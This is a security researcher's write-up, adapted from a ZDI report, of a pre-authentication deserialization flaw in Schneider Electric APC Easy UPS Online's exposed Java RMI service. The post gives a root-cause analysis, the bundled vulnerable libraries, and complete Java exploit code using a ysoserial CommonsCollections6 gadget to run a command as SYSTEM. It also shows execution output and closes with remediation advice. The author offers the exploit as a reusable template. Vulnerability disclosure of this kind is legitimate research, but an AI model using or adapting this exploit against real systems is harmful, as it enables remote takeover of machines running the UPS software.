## Schneider Electric APC Easy UPS RCE - Java RMI Applevel Deser for JEP>=290 

Last year I did research [Schneider APC UPS](https://www.apc.com/za/en/download/document/APC_install_APC_UPS_windows/) for vulnerabilities to eventually report them to the [ZDI](https://www.zerodayinitiative.com/) plattform.

One of the identified bugs was patched in between of the time me reporting it to the ZDI plattorm and ZDI analyzing the report which allows me to share it with you.

The vulnerability was a deserialization on the application level within an exposed RMI method. So when a non-primitive type is used as one of the parameters of an exposed RMI method, we can abuse that for arbitrary deserialization and might leverage this for RCE. I'll share exploit code which can be used as a sort of template when you identify a similar issue and want to create a standalone exploit.


So without further ado here is a slightly modified version of the report I sent to ZDI.


## Schneider Electric APC Easy UPS Online - RMI Deserialization to RCE

Schneider Electric APC Easy UPS suffers from an RCE due to vulnerable Classes within the Classpath. `<snippped some info>`




#### Affected Products:
---
* Schneider Electric APC Easy UPS Online ( Version: v2.5-GA-01-22261)


#### Download Links:
---
* Schneider Electric APC Easy UPS Online - https://www.apc.com/za/en/download/document/APC_install_APC_UPS_windows/


#### Short Intro:
---
The named product expose an RMI registry on TCP port 41009 which exposes several interfaces. A number of these interfaces expose RMI Methods,
which accept a non-primitive data-type as a parameter and self-implemented Classes. Also known vulnerable Classes (Classes containing RCE Gadgets) are within the classpath.
This leads to a scenario where pre-auth RCE as the SYSTEM user can be obtained through deserialization attacks.


#### Root Cause Analysis:
---
For a good introduction into the deserialization exploitation of RMI Methods with non-primitive data-type parameters the following blog post is recommended:
[Mogwailabs - Attacking Java RMI Services After jep 290](https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/)

The overall problem still is, that non-primitive data types within Java RMI need to be generated on the other side and the infamous
`readObject()` is called.

So as soon as a vulnerable Class (a Class containing a useful Gadget) is within the classpath and it is not restricted to be loaded, this can lead to RCE.


`C:\APCUPS\monitor\upsLinkMonitor.jar` file.

```java
/*      */ package cn.com.voltronicpower.rmiclass;
/*      */ 

/*      */ public class SystemService
/*      */   extends ServiceSupport
/*      */   implements SystemServiceInterface
/*      */ {
...
/*      */   
/*      */   public boolean updateComputer(ComputerConfig computerconfig) throws RemoteException {
/*  544 */     ComputerDao dao = new ComputerDao();
/*  545 */     return dao.updateComputerConfig(computerconfig);
/*      */   }
/*      */   
```

The Class `SystemService` implements the `SystemServiceInterface` and contains a Method which accepts a self-implemented Class (`ComputerConfig`) as parameter. This method was chosen to get targeted for the attack.

The overall idea is now, to pass an RCE Gadget Object instead of the expected ComputerConfig Object and get Remote Command Execution as SYSTEM user through the
deserialization of our passed Gadget Object.


While checking for potential gadgets, a look inside the respective lib directory revealed the following:


```cmd
C:\APCUPS\tomcat\webapps\SchneiderUPS\WEB-INF\lib>dir
 Volume in drive C has no label.
 Volume Serial Number is 7600-863E

 Directory of C:\APCUPS\tomcat\webapps\SchneiderUPS\WEB-INF\lib

15/10/2022  11:13    <DIR>          .
15/10/2022  11:13    <DIR>          ..
09/03/2021  20:17           188,671 commons-beanutils-1.7.0.jar
09/03/2021  20:17           559,366 commons-collections-3.1.jar		[1]
25/11/2020  17:24            72,446 commons-fileupload-1.4.jar		[2]
25/11/2020  17:24           214,788 commons-io-2.6.jar
25/11/2020  17:24           501,879 commons-lang3-3.8.1.jar
27/04/2022  11:19            38,015 commons-logging.jar
27/04/2022  11:19           313,898 dom4j-1.6.1.jar
09/03/2021  20:17           858,834 dwr.jar
09/03/2021  20:17            86,487 ezmorph-1.0.6.jar
02/11/2021  11:32           661,717 fastjson-1.2.78.jar
25/11/2020  17:24         1,702,975 freemarker-2.3.30.jar
27/04/2022  11:19         1,613,319 iText-5.0.6.jar
25/11/2020  17:24           750,581 javassist-3.20.0-GA.jar
09/03/2021  20:17           159,123 json-lib-2.4-jdk15.jar
09/03/2021  20:17            20,682 jstl.jar
27/12/2021  18:24           301,873 log4j-api-2.17.1.jar
27/12/2021  18:24         1,790,452 log4j-core-2.17.1.jar
25/11/2020  17:24           263,488 ognl-3.1.28.jar
27/04/2022  11:20           348,241 SNMPNetwork.jar
25/11/2020  17:24         1,624,974 struts2-core-2.5.26.jar
09/11/2021  15:10            93,128 upsLinkRMI.jar
22/02/2022  15:43            51,653 upsLinkUtil.jar
              22 File(s)     12,216,590 bytes
               2 Dir(s)  16,346,681,344 bytes free
```

[1] Is definatately vulnerable and used within the provided exploit. [2] Is very likely also vulnerable.


To summarize what is the case:
* JEP>=290 -> no direct RMI exploitation using `ysoserial.exploit.RMIRegistryExploit`
* RMI exposed Method uses non-primitive data type as parameter 
* Vulnerable Classes (containing RCE Gagdgets) in Classpath




#### Exploit:
---

```javaimport java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.lang.reflect.InvocationHandler;

import ysoserial.payloads.CommonsCollections6;
import cn.com.voltronicpower.data.bean.ComputerConfig;
import cn.com.voltronicpower.rmiInterface.SystemServiceInterface;

public class Main {

	public static void main(String[] args) throws Throwable {

	  try {

		String serverIP = args[0];
		int serverPort = 41009;
			
		Registry registry = LocateRegistry.getRegistry(serverIP, serverPort);			// [1]
		SystemServiceInterface ssi = (SystemServiceInterface) registry.lookup("system");	// [2]
			
		InvocationHandler ih = Proxy.getInvocationHandler(ssi);					// [3]
		Method method = SystemServiceInterface.class.getMethod("updateComputer", new Class[] {ComputerConfig.class });	// [4]
		Object payload = new CommonsCollections6().getObject("mspaint.exe");			// [5]

		Object[] params = new Object[] {							// [6]
			payload
		};
			
		ih.invoke(ssi, method, params);								// [7]

	  } catch (Exception e) {
	  	System.out.println(e.toString());
	  	e.printStackTrace();
	  }
	}
}

```

Like in a normal RMI client program, a handle to the registry is obtained [1]. And still like in a normal RMI client the Interface of the respective endpoint
is obtained subsequently [2]. Then the InvocationHandler from the `Remote` Object obtained through the `lookup` call is obtained [3].
A new Method is created through reflection, having the same "settings" as the normal "updateComputer" Method [4].

At [5] a ysoserial payload is generated using the CommonsCollections6 gadget chain. The interesting part now starts to happen, we create an Object array [6] which 
only includes our RCE Gadget. And finally call the invocation handler of our RMI Endpoint with the respective method and our malicious argument [7] to achieve RCE as SYSTEM user.

While there exist writups (https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/) explaining how it is achievable in theory and also hint at solutions like using custom debugger setups, 
this method of how to abuse that kind of vulnerabilities in an elegant and using just a small number of LoC is new to the public domain to my knowledge.

Added note:
```
My colleague @qtc_de implemented a similar method within his remote-method-guesser tool [rmg](https://github.com/qtc-de/remote-method-guesser)
```


Note: It is necessary to have the `upsLinkMonitor.jar` and `ysoserial.jar` files within the classpath for successful compilation.


Example execution (these errors are expected and don't show a failed exploit attempt):
Note: The exploit was developed with jdk1.8 within eclipse. Due to the nature of the exploit it is recommended to use jre 1.8 for execution.


```cmd
C:\APCUPS\openJDK\bin>java.exe -version
openjdk version "1.8.0_322"
OpenJDK Runtime Environment (Zulu 8.60.0.21-CA-win64) (build 1.8.0_322-b06)
OpenJDK 64-Bit Server VM (Zulu 8.60.0.21-CA-win64) (build 25.322-b06, mixed mode)



C:\APCUPS\openJDK\bin>java.exe -jar C:\Users\user\Desktop\APC-UPS-RMI-AppDeser.jar 172.16.38.131
java.lang.IllegalArgumentException: argument type mismatch
java.lang.IllegalArgumentException: argument type mismatch
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:357)
        at sun.rmi.transport.Transport$1.run(Transport.java:200)
        at sun.rmi.transport.Transport$1.run(Transport.java:197)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:573)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:834)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:688)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:687)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
        at java.lang.Thread.run(Thread.java:750)
        at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:303)
        at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:279)
        at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:164)
        at java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod(RemoteObjectInvocationHandler.java:235)
        at java.rmi.server.RemoteObjectInvocationHandler.invoke(RemoteObjectInvocationHandler.java:180)
        at pwn.Main.main(Main.java:138)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at org.eclipse.jdt.internal.jarinjarloader.JarRsrcLoader.main(JarRsrcLoader.java:61)
```

Afterwards `SchneiderUPSMonitor.exe` will have spawned `mspaint.exe` as a child process, running as SYSTEM.



#### Recommendation:
---
It is recommended to update all the used libraries and cross-check with the listed ysoserial gadgets [ysoserial](https://github.com/frohoff/ysoserial) to have higher versions on each.
Additionally it might make sense to add deserialization filters, for more info the documentation [serialization-filtering](https://docs.oracle.com/javase/10/core/serialization-filtering1.htm) can be consulted.


